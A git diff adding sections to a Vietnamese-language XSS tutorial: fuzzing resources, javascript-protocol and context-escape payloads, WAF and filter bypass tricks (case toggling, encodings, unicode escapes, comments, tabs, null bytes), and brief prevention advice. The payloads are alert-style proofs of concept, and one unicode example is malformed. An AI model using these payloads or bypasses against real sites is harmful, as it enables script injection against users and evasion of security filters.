@@ -82,6 +82,33 @@ Giống với các cuộc tấn công khác của XSS, kẻ tấn công có th�
 - Từ đó xác định nó thuộc loại lỗ hổng XSS nào rồi khai thác như phần trên theo từng loại.
 
 ### Một số kỹ thuật và cách bypass
+#### Fuzz/Brute-Force
+- Test các tags html, custom tag và event có thể xss.(Sử dụng cheat sheet của <a href="https://portswigger.net/web-security/cross-site-scripting/cheat-sheet">PortSwigger</a>)
+- Dùng tool như burp suite và wordlist như <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection">PayloadsAllTheThings</a>, <a href="https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/XSS" >Seclists</a>,...
+#### Javascript Pseudo-Protocol, Inside JavaScript code và escape ra ngoài:
+- `<a href="javascript:alert(1)">click</a>`
+- `'-alert(1)-'`, `';-alert(1)//`, `\';alert(1)//`, ...
+- `"><script ...`, `</script><img src=1 onerror=alert(document.domain)>`, ...
+#### Bypass WAF, filters, blacklist... :
+Kỹ thuật obfuscation: 
+- Case Toggling: Kết hợp chữ hoa chữ thường như `<ScRipT>alert()</sCRipT>`.
+- URL encoding, HTML encoding.
+- Chuẩn hóa các ký tự unicode: `prompt()` => `\u0070r\u06f\u006dpt()`.
+- Sử dụng comment: `<!--><script>alert/**/()/**/</script>`
+- Double encoding: `%253Cscript%253Ealert()%253C%252Fscript%253E`
+- Dùng tabs: `<IMG SRC="    jav    ascri    pt:alert    ();">`.
+- Dùng các ký tự null bytes: `<scri%00pt>alert(1);</scri%00pt>`
+
+## Cách ngăn chặn XSS
+### Xử lý đầu vào
+- Lọc đầu vào: Sử dụng blacklist, whitelist, filters, regex, ...
+- Mã hóa đầu ra để không hiển thị các ký tự đặc biệt nhằm tấn công
+- Sử dụng các thư viện và frameworks an toàn.
+- Sử dụng HTTP-only Cookies để tránh bị đánh cắp, CSP để kiểm soát tài nguyên ngoài.
+- Thường xuyên cập nhật phần mềm, các dạng tấn công mới 
+
+
+
 
 
 
